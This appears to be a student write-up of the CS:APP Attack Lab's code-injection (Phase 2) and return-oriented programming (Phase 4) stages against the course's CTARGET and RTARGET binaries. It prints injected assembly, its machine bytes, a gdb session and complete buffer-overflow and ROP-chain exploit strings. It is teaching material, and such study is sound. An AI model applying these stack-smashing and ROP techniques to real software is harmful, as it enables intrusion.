## Code Injection Attacks

### Phase2

The task is to get `CTARGET` to execute the code for `touch2` rather than returning to `test`, while pass your cookie as the first argument. 

The code injection attack involves two stages. First, we need to find the binary code of the injected code and place it into the exploit string. Next, we modify the return address and make it pointing to the **starting address of the exploit string**. Therefore, the injected code will be executed and the attaker can take control. 

Recall that the first argument to a function is passed in register `%rdi`. The injected code can be written as: 

```assembly
mov $0x59b997fa, %rdi /* modify the first argument */ 
pushq $0x4017ec /* starting address of touch2 */ 
ret /* return to touch2 */
```

Enter the command `gcc -c touch2.s` and `objdump -d touch2.o > touch2.asm` to get the binary code. 

```c++
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

Then, use `gdb` tool to get the starting address of the exploit string: 

```c++
(gdb) b *0x4017af
(gdb) r -q
(gdb) print /x $rsp
$1 = 0x5561dc78
```

After these steps, we can get the exploit string: 

```c++
48 c7 c7 fa 97 b9 59 	/* mov $0x59b997fa,%rdi */ 
68 ec 17 40 00 			/* pushq  $0x4017ec */
c3						/* retq (to touch2) */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* paddings */
00 00 00 00 00 00 00 00 00 00	/* paddings */
78 dc 61 55 00 00 00 00	/* starting address of exploit string */ 
```

## Return-Oriented Programming

### Phase4

Performing code injection attacks on program `RTARGET` is much more difficult than it is for `CTARGET`, because it uses two techniques to thwart such attacks: 

- It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
- It marks the section of memory holding the stack as non-executable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.

However, clever people have devised strategies for getting things done by executing existing code. The strategy with ROP (return-oriented programming) is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction `ret`.

We use `ret` to navigate to possible instructions and keep `ret` to the next one. The construction of phase2 goes like this:

<img src = "C:\Users\16549\AppData\Roaming\Typora\typora-user-images\image-20240911220734330.png" width = 500>

```c++
/* paddings */
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
/* address of addval_219 : 58 90 c3 <==> popq %rax ret */
ab 19 40 00 00 00 00 00
/* cookie */ 
fa 97 b9 59 00 00 00 00 
/* address of addval_273 : 48 89 c7 c3 <==> mov %rax,%rdi ret  */
a2 19 40 00 00 00 00 00
/* address of touch2 */
ec 17 40 00 00 00 00 00
```

